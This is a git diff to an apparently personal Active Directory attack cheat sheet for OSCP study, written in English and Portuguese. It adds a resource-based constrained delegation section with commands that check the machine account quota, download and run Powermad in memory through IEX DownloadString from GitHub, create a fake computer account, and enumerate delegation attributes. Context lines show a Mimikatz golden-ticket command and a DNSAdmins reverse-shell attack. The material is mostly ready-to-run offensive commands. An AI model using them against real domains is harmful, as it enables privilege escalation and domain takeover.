@@ -1494,6 +1494,91 @@ enter-pssession -computername TECH-DC01.TECH.LOCAL
 kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
 ```
 
+## RESOURCE-BASED CONSTRAINED DELEGATION
+This is similar to the basic Constrained Delegation but instead of giving permissions to an object to impersonate any user against a service. Resource-based Constrain Delegation sets in the object who is able to impersonate any user against it.
+In this case, the constrained object will have an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity with the name of the user that can impersonate any other user against it.
+Another important difference from this Constrained Delegation to the other delegations is that any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).
+
+If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
+
+##### RESOURCE-BASED CONSTRAINED DELEGATION - LISTAR QUANTOS COMPUTADORES UM USUARIO PODE ADICIONAR NO DOMINIO
+```
+Get-ADObject -Identity "DC=TECH,DC=LOCAL" -Properties MS-DS-MachineAccountQuota
+```
+```
+Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
+```
+##### RESOURCE-BASED CONSTRAINED DELEGATION - CRIAR CONTA FALSA DE COMPUTADOR
+CARREGAR O POWERMAD
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Powermad.ps1 -Outfile Powermad.ps1
+import-module .\powermad.ps1
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Powermad.ps1")
+```
+CRIAR UMA CONTA FALSA DE COMPUTADOR
+```
+New-MachineAccount -MachineAccount ATTACKER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+
+
+
+##### RESOURCE-BASED CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH RESOURCE-BASED CONSTRAINED DELEGATION
+ENCONTRAR APENAS COMPUTADORES
+```
+$FormatEnumerationLimit=-1
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+```
+ENCONTRAR APENAS USUARIOS
+```
+$FormatEnumerationLimit=-1
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+```
+ENCONTRAR COMPUTADORES E USUARIOS
+```
+$FormatEnumerationLimit=-1
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
+ENCONTRAR APENAS COMPUTADORES (POWERVIEW)
+```
+$FormatEnumerationLimit=-1
+Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
+Get-DomainComputer -TrustedToAuth
+```
+ENCONTRAR APENAS USUARIOS (POWERVIEW)
+```
+$FormatEnumerationLimit=-1
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
+Get-DomainUser -TrustedToAuth
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## ATAQUE DNSADMINS
 If you own a user who is a member of the 'DNS admin' it is possible to perform various attacks on the DNS server (usually Domain Controller) It is possible to get a reverse shell with this, but this puts the whole DNS traffic flat within the domain as this keeps the DNS service busy! For more information see [ https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise ]
